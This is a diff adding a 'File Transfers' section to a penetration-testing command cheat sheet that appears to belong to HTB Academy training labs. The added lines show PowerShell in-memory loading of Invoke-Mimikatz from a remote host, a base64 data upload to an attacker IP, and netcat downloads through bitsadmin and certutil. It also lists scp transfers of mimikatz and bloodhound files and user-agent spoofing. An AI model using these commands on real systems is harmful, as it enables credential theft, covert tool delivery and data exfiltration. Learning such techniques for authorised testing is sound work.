@@ -195,6 +195,20 @@ ZAP	https://www.zaproxy.org/
 ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt	Discovering files and folders that cannot be spotted by browsing the website.
 ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://www.target.domain/FOLDERS/WORDLISTEXTENSIONS	Mutated bruteforcing against the target web server.
 
+File Transfers:
+
+Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1	Download a file with PowerShell
+IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')	Execute a file in memory using PowerShell
+Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64	Upload a file with PowerShell
+bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe	Download a file using Bitsadmin
+certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe	Download a file using Certutil
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh	Download a file using Wget
+curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh	Download a file using cURL
+php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'	Download a file using PHP
+scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip	Upload a file using SCP
+scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe	Download a file using SCP
+Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"	Invoke-WebRequest using a Chrome User Agent
+
 Shells & Payloads:
 
 xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!	CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol
